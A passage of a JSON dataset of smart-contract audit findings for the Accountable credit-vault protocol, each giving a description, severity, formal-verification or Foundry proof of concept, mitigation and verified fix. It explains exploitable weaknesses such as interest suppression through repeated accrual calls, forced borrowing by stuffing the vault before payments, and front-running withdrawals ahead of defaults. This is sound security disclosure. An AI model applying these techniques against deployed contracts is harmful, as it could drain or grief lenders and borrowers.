AccessBase {\n\n     /// @dev Checks transfer restrictions before executing the underlying transfer\n     function _checkTransfer(uint256 amount, address from, address to) private {\n-        if (amount == 0) revert ZeroAmount();\n+        // @certora FIX for eip20_transferSupportZeroAmount and eip20_transferFromSupportZeroAmount\n+        // if (amount == 0) revert ZeroAmount();\n         if (!transferableShares) revert SharesNotTransferable();\n         if (!isVerified(to, msg.data)) revert Unauthorized();\n         if (throttledTransfers[from] > block.timestamp) revert TransferCooldown();\n```\n\n**Accountable:** Fixed in commit [`e90d3de`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/e90d3de5c133c73f0e783d552bb4e256400a547c)\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62995",
      "title": "Incorrect event emission is possible in `AccountableAsyncRedeemVault::cancelRedeemRequest` flows",
      "impact": "LOW",
      "content": "**Description:** `cancelRedeemRequest()` takes \"requestID\" as input, but it is never used and never validated to be associated with the input controller address.\n\nAll cancellation flows (immediate/ async) work with the requestID of the controller address stored in `_requestIds[controller]`, but the input requestID is only used for event data in `CancelRedeemRequest()` and `CancelRedeemClaimable()` events.\n\nBecause this is never verified, caller can input any requestID and have it emitted in the events.\n\n**Impact:** Incorrect event emission is possible, potentially leading to data corruption for the frontend and anyone else using this event data.\n\n**Recommended Mitigation:** Remove the \"requestID\" parameter from the `cancelRedeemRequest()` function definition and simply use the existing requestID of the controller in event emission.\n\n**Accountable:** Fixed in commits [`aa64491`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/aa64491b1ebe68375793efbc961a323ea739f58c) and [`0675c3d`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/0675c3de2f4eae3456470f04a2241c8f60255088).\n\n**Cyfrin:** Verified. The redeem request of the controller is now used.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62994",
      "title": "Violations of ERC7540 specs",
      "impact": "LOW",
      "content": "**Description:** Several deviations from the ERC7540 specs have been noticed for `AccountableAsyncRedeemVault`\n\n1. According to [ERC-7540](https://eips.ethereum.org/EIPS/eip-7540) specification:\n\n> Redeem Request approval of shares for a msg.sender NOT equal to owner may come either from ERC-20 approval over the shares of owner or if the owner has approved the msg.sender as an operator.\n\nThe current implementation in `requestRedeem()` only supports operator approval (from owner to caller). The contract does not implement the ERC-20 allowance path for share approval, limiting the request redeem functionality to only operator-approved addresses.\n\n2. As per the EIP,\n\n> All requests with the same requestID MUST transition from Pending to Claimable state at the same time, and receive the same exchange rate\n\nThis means the request should always gets processed in full. Right now, the vault implementation allows partial redemptions and that too at different share prices (if processingMode == CurrentPrice).\n\n\n**Impact:** Non-compliance with ERC7540.\n\n**Recommended Mitigation:** Consider documenting if the vault is intended to be completely compliant with the EIP, and if so, consider changing the implementation accordingly.\n\n**Accountable:** We acknowledge this as it's not our intention to be 100% compliant, we will document this.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62993",
      "title": "Consider enforcing a minimum deposit amount",
      "impact": "LOW",
      "content": "The vault/strategy accepts arbitrarily small deposits (down to 1 wei). While functionally correct, dust deposits are effectively useless for legitimate users (since the gas to call `deposit` often exceeds the value deposited) and can be abused by adversaries to abuse rounding edge cases.\n\nTo remove a possible attack vector for black hats, consider enforcing a `minimumDepositAmount`.\n\n**Accountable:** Fixed in [`b9edb2b`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/b9edb2bf071db803fbd16460411688207aedc85d)\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62992",
      "title": "Consider consistently use `Ownable2Step`",
      "impact": "LOW",
      "content": "**Description:** Currently some contracts use just Ownable, consider have all contracts use Ownable2Step to prevent accidental ownership loss.\n\n\n**Accontable:**\nFixed in commit [`be75091`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/be7509165d468fd19bf48bab3fa87e565412a5b6)\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62991",
      "title": "Prevent accidental ownership and admin renouncement",
      "impact": "LOW",
      "content": "**Description:** The inherited `renounceOwnership()` and allow the last authority to remove themselves, potentially leaving the contract permanently ownerless or admin‑less, blocking critical functions.\n\nConsider override `renounceOwnership()` in `TokenAirdrop` to always revert.\n\n**Accountable:** Fixed in commit [`be75091`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/be7509165d468fd19bf48bab3fa87e565412a5b6)\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62990",
      "title": "Deployment script requires unencrypted private key",
      "impact": "LOW",
      "content": "**Description:** The deployment scripts [`FactoryScript.s.sol`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/script/FactoryScript.s.sol) and [`FeeManagerScript.s.sol`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/script/FeeManagerScript.s.sol) requires a private key to be stored in clear text as an environment variable:\n\n```solidity\nuint256 deployerPk = vm.envUint(\"DEPLOYER_TESTNET_PK\");\n```\n\nStoring private keys in plain text represents an operational security risk, as it increases the chance of accidental exposure through version control, misconfigured backups, or compromised developer machines.\n\nA more secure approach is to use Foundry’s [wallet management features](https://getfoundry.sh/forge/reference/script/), which allow encrypted key storage. For example, a private key can be imported into a local keystore using [`cast`](https://getfoundry.sh/cast/reference/wallet/import/):\n\n```bash\ncast wallet import deployerKey --interactive\n```\n\nThis key can then be referenced securely during deployment:\n\n```bash\nforge script script/Deploy.s.sol:DeployScript \\\n    --rpc-url \"$RPC_URL\" \\\n    --broadcast \\\n    --account deployerKey \\\n    --sender <address associated with deployerKey> \\\n    -vvv\n```\nAnd used just with `vm.startBroadcast()`:\n```solidity\nvm.startBroadcast();\n\n...\n\nvm.stopBroadcast();\n```\n\nFor additional guidance, see [this explanation video](https://www.youtube.com/watch?v=VQe7cIpaE54) by Patrick.\n\n**Accountable:** Fixed in commit [`79d8cfd`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/79d8cfd8dee652adb0964ade05280a745cedb3b3)\n\n**Cyfrin:** Verified. Deploy scripts now don't require a private key in clear text.\n\n\\clearpage",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62989",
      "title": "`Authorizable::_verify` should use EIP-712 typed structured data hashing",
      "impact": "LOW",
      "content": "**Description:** [`Authorizable::_verify`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/access/Authorizable.sol#L46-L78) signs ad-hoc payloads that include `chainId`, but the flow is not [EIP-712](https://eips.ethereum.org/EIPS/eip-712) typed-data compliant. This limits wallet UX/visibility and interoperability and mixes domain data (`chainId`) with message data.\n\n**Impact:** Users are more susceptible to ambiguous signing prompts; weaker ecosystem compatibility; harder audits/upgrades; higher risk of encoding/packing mistakes and replay bugs across contracts or chains.\n\n**Recommended mitigation:**\nAdopt EIP-712 and move `chainId` to the domain separator (remove it from the struct). Keep the existing intent of the message:\n\n* **Domain:** `{ name: \"Authorizable\", version: \"1\", chainId, verifyingContract: address(this) }`.\n* **Typed struct (no chainId inside):**\n\n  ```solidity\n  struct TxAuthData {\n      bytes   functionCallData;   // selector + encoded args\n      address contractAddress;    // target contract (can be redundant with domain; decide and document)\n      address account;            // controller / signer subject\n      uint256 nonce;              // per-account nonce\n      uint256 blockExpiration;    // deadline\n  }\n\n  bytes32 constant TXAUTH_TYPEHASH = keccak256(\n      \"TxAuthData(bytes functionCallData,address contractAddress,address account,uint256 nonce,uint256 blockExpiration)\"\n  );\n  ```\n* **Hashing & verify (using OZ EIP712 + SignatureChecker):**\n\n  ```solidity\n  bytes32 structHash = keccak256(abi.encode(\n      TXAUTH_TYPEHASH,\n      keccak256(txAuth.functionCallData), // hash dynamic bytes\n      txAuth.contractAddress,\n      txAuth.account,\n      txAuth.nonce,\n      txAuth.blockExpiration\n  ));\n  bytes32 digest = _hashTypedDataV4(structHash);\n  require(\n      SignatureChecker.isValidSignatureNow(signer, digest, signature),\n      \"INVALID_SIGNATURE\"\n  );\n  ```\n**Accountable:** Fixed in commit [`70cd486`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/70cd4863e3bef0f80f2eeb012c79a801c099fc7e)\n\n**Cyfrin:** Verified. EIP-712 typed data is now used for the signatures.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62988",
      "title": "Reserved assets could be extracted from the Vault",
      "impact": "LOW",
      "content": "**Description:** Some strategy functions can release assets without checking if those assets are part of `reservedLiquidity`. `AccountableFixedTerm._loan.drawableFunds` is not verified to be in sync with the queue `reservedLiquidity`. Hence the borrower can inadvertently borrow more funds than they should.\n\n**Impact:** The vault can become insolvent by releasing funds needed to honor a withdrawal.\n\n**Proof of Concept:** Violated in `FixedTerm.acceptLoanLocked(), FixedTerm.borrow(), FixedTerm.pay(), FixedTerm.acceptLoanDynamic(), FixedTerm.claimInterest()`: https://prover.certora.com/output/52567/edb399a43d1849a9b22f027e66b17924/?anonymousKey=3dcf62dfa004381083966b3639b6a485fa2e9501\n\n```solidity\n// Reserved liquidity must not exceed total assets\ninvariant reservedLiquidityBacked(env e)\n    ghostReservedLiquidity256 <= ghostTotalAssets256\n```\n\n**Recommended Mitigation:** When `reservedLiquidity` is increased in the withdrawal queue, this needs to be synced to the FixedTerm starategy.\n\n**Accountable:** Fixed in commit [`979c0e`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/979c0ebe4bd5860fe9b2e446f9fac2ae3919b39c).\n\nIssue was addressed to satisfy the invariant and prevent future upgrades that might allow redemptions in a FixedTerm loan, but as of right now there's no possible way to increase `reservedLiquidity` such that it is out-of-sync with`drawableFunds`.\n\nBorrowing after the loan is in a `Repaid` state cannot happen due to `_requireLoanOngoing` so any redemptions that increase `reservedLiquidity` would require a state when both depositing/borrowing is blocked.\n\n**Cyfrin:** Verified. `reservedLiquidity` is now checked in FixedTerm.",
      "summary": "",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [
        "Auditing and Logging"
      ],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62987",
      "title": "Missing controller validation in `AccountableAsyncRedeemVault::requestRedeem` allows zero address state",
      "impact": "LOW",
      "content": "**Description:** The `requestRedeem()` function fails to call `_checkController(controller)` validation, allowing the zero address to accumulate vault state.\n\n**Impact:** `zeroControllerEmptyState` violation.\n\n**Proof of Concept:** ❌ Violated: https://prover.certora.com/output/52567/acc42433123e4b289c0f84e69fa52a44/?anonymousKey=e60b3d66b5574868073bfde4218b385aa2fe5f2a\n\n```solidity\n// Zero address must have empty state for all vault fields\ninvariant zeroControllerEmptyState(env e)\n    ghostVaultStatesMaxMint256[0] == 0 &&\n    ghostVaultStatesMaxWithdraw256[0] == 0 &&\n    ghostVaultStatesDepositAssets256[0] == 0 &&\n    ghostVaultStatesRedeemShares256[0] == 0 &&\n    ghostVaultStatesDepositPrice256[0] == 0 &&\n    ghostVaultStatesMintPrice256[0] == 0 &&\n    ghostVaultStatesRedeemPrice256[0] == 0 &&\n    ghostVaultStatesWithdrawPrice256[0] == 0 &&\n    ghostVaultStatesPendingDepositRequest256[0] == 0 &&\n    ghostVaultStatesPendingRedeemRequest256[0] == 0 &&\n    ghostVaultStatesClaimableCancelDepositRequest256[0] == 0 &&\n    ghostVaultStatesClaimableCancelRedeemRequest256[0] == 0 &&\n    !ghostVaultStatesPendingCancelDepositRequest[0] &&\n    !ghostVaultStatesPendingCancelRedeemRequest[0] &&\n    ghostRequestIds128[0] == 0\nfiltered { f -> !EXCLUDED_FUNCTION(f) } { preserved with (env eFunc) { SETUP(e, eFunc); } }\n```\n\n✅ Verified after the fix: https://prover.certora.com/output/52567/f385fd34e82c4635bd410279e4da2c97/?anonymousKey=82309551a07845692bfabb2164179224523f87ba\n\n**Recommended Mitigation:**\n```diff\ndiff --git a/credit-vaults-internal/src/vault/AccountableAsyncRedeemVault.sol b/credit-vaults-internal/src/vault/AccountableAsyncRedeemVault.sol\nindex 4cd0a3e..a64f47c 100644\n--- a/credit-vaults-internal/src/vault/AccountableAsyncRedeemVault.sol\n+++ b/credit-vaults-internal/src/vault/AccountableAsyncRedeemVault.sol\n@@ -113,6 +113,9 @@ contract AccountableAsyncRedeemVault is IAccountableAsyncRedeemVault, Accountabl\n         onlyAuth\n         returns (uint256 requestId)\n     {\n+        // @certora FIX for zeroControllerEmptyState\n+        _checkController(controller);\n+\n         _checkOperator(owner);\n         _checkShares(owner, shares);\n```\n\n**Accountable:** Fixed in commit [`e90d3de`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/e90d3de5c133c73f0e783d552bb4e256400a547c)\n\n**Cyfrin:** Verified. `checkController` added as a modifier to the function.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62986",
      "title": "Upgradeable contracts which are inherited from should use ERC7201 namespaced storage layouts or storage gaps to prevent storage collisions",
      "impact": "LOW",
      "content": "**Description:** The protocol has upgradeable contracts which other contracts inherit from. These contracts should either use:\n* [ERC7201](https://eips.ethereum.org/EIPS/eip-7201) namespaced storage layouts - [example](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/access/AccessControlUpgradeable.sol#L60-L72)\n* storage gaps (though this is an [older and no longer preferred](https://blog.openzeppelin.com/introducing-openzeppelin-contracts-5.0#Namespaced) method)\n\nThe ideal mitigation is that all upgradeable contracts use ERC7201 namespaced storage layouts.\n\nWithout using one of the above two techniques storage collision can occur during upgrades.\n\n**Accountable:** Fixed in commit [`8422762`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/842276202616ce58cdf7d766c2792fc3752157ba)\n\n**Cyfrin:** Verified. Namespaced storage now used in `AccountableStrategy`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62985",
      "title": "Invalid `maxWithdraw()` check in `withdraw()`",
      "impact": "MEDIUM",
      "content": "**Description:** Vault incorrectly checks `maxWithdraw(receiver)` instead of `maxWithdraw(controller/owner)`.\n\n**Impact:**\n- Allows unauthorized withdrawals by exploiting the receiver's limits instead of the owner's.\n- DDoS in `withdraw()`\n\n**Proof of Concept:** ❌ Violated: https://prover.certora.com/output/52567/ef88bd2d76b74cafb175f8d026e484b3/?anonymousKey=599db11fbc5df1632ff4006c69a03f836b23fa6c\n\n```solidity\n// MUST NOT be higher than the actual maximum that would be accepted\nrule eip4626_maxWithdrawNoHigherThanActual(env e, uint256 assets, address receiver, address owner) {\n\n    setup(e);\n\n    storage init = lastStorage;\n\n    mathint limit = maxWithdraw(e, owner) at init;\n\n    withdraw@withrevert(e, assets, receiver, owner) at init;\n    bool reverted = lastReverted;\n\n    // Withdrawals above the limit must revert\n    assert(assets > limit => reverted, \"Withdraw above limit MUST revert\");\n}\n```\n\n✅ Verified after the fix: https://prover.certora.com/output/52567/8e7cfdf612d64a4cb7e5d9d9d939968e/?anonymousKey=a961467ded443bd1cab3718ca882be71f38887e9\n\n**Recommended Mitigation:**\n```diff\ndiff --git a/credit-vaults-internal/src/vault/AccountableAsyncRedeemVault.sol b/credit-vaults-internal/src/vault/AccountableAsyncRedeemVault.sol\nindex a64f47c..c8824bb 100644\n--- a/credit-vaults-internal/src/vault/AccountableAsyncRedeemVault.sol\n+++ b/credit-vaults-internal/src/vault/AccountableAsyncRedeemVault.sol\n@@ -173,7 +173,7 @@ contract AccountableAsyncRedeemVault is IAccountableAsyncRedeemVault, Accountabl\n     function withdraw(uint256 assets, address receiver, address controller) public onlyAuth returns (uint256 shares) {\n         _checkController(controller);\n         if (assets == 0) revert ZeroAmount();\n-        if (assets > maxWithdraw(receiver)) revert ExceedsMaxRedeem();\n+        if (assets > maxWithdraw(controller)) revert ExceedsMaxRedeem(); // @certora FIX for eip4626_maxWithdrawNoHigherThanActual (receiver -> controller)\n\n         VaultState storage state = _vaultStates[controller];\n         shares = _convertToShares(assets, state.withdrawPrice, Math.Rounding.Floor);\n```\n\n**Accountable:** Fixed in commit [`6dc92b0`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/6dc92b0b09e8d2e2fc01b94d41902bbf4f5fc293)\n\n**Cyfrin:** Verified. `controller` now passed to `maxWithdraw`.\n\n\\clearpage",
      "summary": "\nThe bug report is about a mistake in the code of the Vault program. The program checks for the maximum amount of money that can be withdrawn by the wrong person, which could allow unauthorized withdrawals and cause a DDoS attack. The report includes a proof of concept that shows the bug being exploited and recommends a fix for the issue. The fix has been implemented and verified by another party. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62984",
      "title": "Frequent `AccountableOpenTerm::accrueInterest` calls reduce interest accrual",
      "impact": "MEDIUM",
      "content": "**Description:** In [`AccountableOpenTerm::_linearInterest`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableOpenTerm.sol#L602-L604), interest accrual uses integer math, `_linearInterest(rate, dt) = rate * dt / DAYS_360_SECONDS`:\n```solidity\nfunction _linearInterest(uint256 interestRate, uint256 timeDelta) internal pure returns (uint256) {\n    return interestRate.mulDiv(timeDelta, DAYS_360_SECONDS);\n}\n```\n\nFor small `timeDelta`, this often rounds to zero. Yet `accrueInterest()` still sets `_accruedAt = block.timestamp` even when the computed increment is zero. Repeated calls with short intervals therefore discard elapsed time in many zero-increment slices, producing a persistently lower `_scaleFactor` than a single accrual over the same wall-clock period.\n\nFor example, for a 15% APY (150_000) you would have to call once every 207 seconds (~4 minutes):\n```\n360 days / 150_000 = 31104000 / 150_000 = 207\n```\n\n**Impact:** Any actor can repeatedly call `accrueInterest()` at short intervals to suppress interest growth. Over time this materially underpays LPs (lower share price / fewer assets owed by the borrower) and reduces protocol fee bases tied to interest. The effect compounds with call cadence and APR, creating measurable loss without needing privileged access.\n\n**Proof of Concept:** Add the following test to `AccountableOpenTerm.t.sol`:\n```solidity\nfunction test_interest_rounding_from_frequent_accrue_calls() public {\n    vm.warp(1739893670);\n\n    vm.prank(manager);\n    usdcLoan.setPendingBorrower(borrower);\n    vm.prank(borrower);\n    usdcLoan.acceptBorrowerRole();\n\n    // Use a common APR (15%) and short interval; depositPeriod = 0 to keep price logic simple.\n    LoanTerms memory terms = LoanTerms({\n        minDeposit: 0,\n        minRedeem: 0,\n        maxCapacity: USDC_AMOUNT,\n        minCapacity: USDC_AMOUNT / 2,\n        interestRate: 150_000,        // 15% APR in bps units\n        interestInterval: 30 days,\n        duration: 0,\n        depositPeriod: 0,\n        acceptGracePeriod: 0,\n        lateInterestGracePeriod: 0,\n        lateInterestPenalty: 0,\n        withdrawalPeriod: 0\n    });\n    vm.prank(manager);\n    usdcLoan.setTerms(terms);\n    vm.prank(borrower);\n    usdcLoan.acceptTerms();\n\n    // Provide principal so interest accrues on outstanding assets.\n    vm.prank(alice);\n    usdcVault.deposit(USDC_AMOUNT, alice, alice);\n\n    // Snapshot the baseline state just after start.\n    uint256 snap = vm.snapshot();\n\n    // ------------------------------------------------------------\n    // Scenario A: \"Spam accrual\" — call accrueInterest() every 12s for 1 hour.\n    // Each 12s step yields baseRate = rate * 12 / 360d ≈ 0 (integer), but _accruedAt is reset,\n    // so we lose that fractional time forever.\n    // ------------------------------------------------------------\n    uint256 step = 180;          // 3 minutes\n    uint256 total = 3600;        // 1 hour\n    uint256 n = total / step;    // 300 iterations\n\n    for (uint256 i = 0; i < n; i++) {\n        vm.warp(block.timestamp + step);\n        usdcLoan.accrueInterest(); // returns new scale but we just trigger the reset\n    }\n\n    // Capture the resulting scale factor after the spammy accrual pattern\n    uint256 sfSpam = usdcLoan.accrueInterest(); // one more call just to read the value\n\n    // ------------------------------------------------------------\n    // Scenario B: Single accrual after the same total wall-clock time.\n    // ------------------------------------------------------------\n    vm.revertTo(snap);\n    vm.warp(block.timestamp + total);\n    uint256 sfClean = usdcLoan.accrueInterest();\n\n    // Expect the spammed path to have strictly lower scale factor than the clean path.\n    assertLt(sfSpam, sfClean, \"frequent zero-delta accrual bleeds interest vs single accrual\");\n\n    // Anything more often than 207 in this case will result in no interest growth at all.\n    assertEq(sfSpam, 1e36, \"frequent accruals yield no interest growth\");\n}\n```\n\n**Recommended Mitigation:** Consider using higher precision to track interest rate. For example, 1e18 or 1e36.\n\n**Accountable:** Fixed in commit [`29c3f72`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/29c3f72ddcb73474918dc3e74a52a2dd3c247bb5)\n\n**Cyfrin:** Verified. `_linearInterest` now scales with `PRECISION`.",
      "summary": "\nThe bug report discusses an issue with the `AccountableOpenTerm::_linearInterest` function, which is used for interest accrual in the Accountable Protocol. The function uses integer math, which can result in rounding to zero for small time intervals. This means that even when there is no interest growth, the `_accruedAt` variable is still set, leading to a lower `_scaleFactor` over time. This can be exploited by anyone to suppress interest growth, resulting in lower returns for LPs and reduced protocol fees. A proof of concept test has been provided to demonstrate this issue, and a recommended mitigation is to use higher precision for tracking interest rates. The bug has been fixed in the latest commit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62983",
      "title": "Auto-draw on `AccountableFixedTerm::pay` lets third parties force unwanted borrowing",
      "impact": "MEDIUM",
      "content": "In [`AccountableFixedTerm::pay`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableFixedTerm.sol#L354-L357), any positive `_loan.drawableFunds` are automatically drawn via `_updateAndRelease(drawableFunds)` before transferring the due interest/fees:\n```solidity\nuint256 drawableFunds = _loan.drawableFunds;\nif (drawableFunds > 0) {\n    _updateAndRelease(drawableFunds);\n}\n```\n\nSince `_loan.drawableFunds` increases when users deposit/mint into the vault, a third party can deposit immediately before the borrower calls `pay`. This causes `pay` to both increase `_loan.outstandingPrincipal` by the new liquidity and also add remaining-term interest on that added principal, while releasing the assets to the borrower, without borrower consent.\n\n**Impact:** Borrower loses discretion over principal size. Calling `pay` can increase debt (principal + future interest) unexpectedly. This enables griefing/economic DoS as attackers can “stuff” the vault before each payment window, repeatedly forcing draws and increasing interest payments in the future.\n\n**Recommended Mitigation:** Consider removing auto-draw from `AccountableFixedTerm::pay`. Loan increases should occur only via an explicit borrower action (e.g., `draw(uint256)`), not implicitly during interest payment.\n\n**Accountable:** Fixed in commit [`03f871b`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/03f871bfc7baff5fe5f9dfbd8a0ef74e99619e78)\n\n**Cyfrin:** Verified. \"auto-draw\" is removed from `pay`.",
      "summary": "\nThe bug report discusses an issue with the `AccountableFixedTerm` contract's `pay` function. This function automatically draws any positive drawable funds before transferring due interest or fees. However, this can lead to unexpected increases in debt for the borrower if a third party deposits funds into the vault right before the borrower calls `pay`. This can be exploited to cause griefing or economic denial of service attacks. The recommended solution is to remove the auto-draw feature from the `pay` function and only allow loan increases through explicit borrower actions. This bug has been fixed in the `03f871b` commit of the `credit-vaults-internal` repository.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62982",
      "title": "Withdrawal queue `RequestPrice` can be front run in case of defaults",
      "impact": "MEDIUM",
      "content": "**Description:** When `processingMode == ProcessingMode.RequestPrice` in `AccountableWithdrawalQueue`, a redeem request’s value is fixed at the request-time share price. The request is later processed potentially at a very different price.\n\n**Impact:** * Normal operation: Requesters are typically disadvantaged because price usually rises as interest accrues. Locking at request time forfeits subsequent gains.\n* Defaults: Requesters can front-run defaults by submitting withdrawals just before delinquency/default and keep the pre-default higher price, draining liquidity and pushing losses onto remaining LPs. This worsens loss socialization precisely when fairness matters most.\n\n**Recommended Mitigation:** Consider removing `ProcessingMode.RequestPrice` (and `AccountableWithdrawalQueue .processingMode` all together) so redemption value is always determined at processing time. Alternatively implement a safeguard for large price movements that will invalidate the redeem request.\n\n**Accontable:**\nFixed in commit [`4e5eef5`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/4e5eef57464d548ec09048eae27b6fcc1489a5c3)\n\n**Cyfrin:** Verified. `processingMode` removed and current price used throughout.",
      "summary": "\nThe bug report explains that when the `processingMode` is set to `ProcessingMode.RequestPrice` in the `AccountableWithdrawalQueue`, there is an issue with the redeem request's value being fixed at the time of the request. This means that the request is processed at a potentially different price, which can disadvantage requesters. This can also lead to front-running defaults and causing losses for other users. To fix this, it is recommended to remove `processingMode` or implement a safeguard for large price movements. The bug has been fixed and verified by Cyfrin.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62981",
      "title": "Borrower in OpenTerm loan can stay delinquent effectively forever",
      "impact": "MEDIUM",
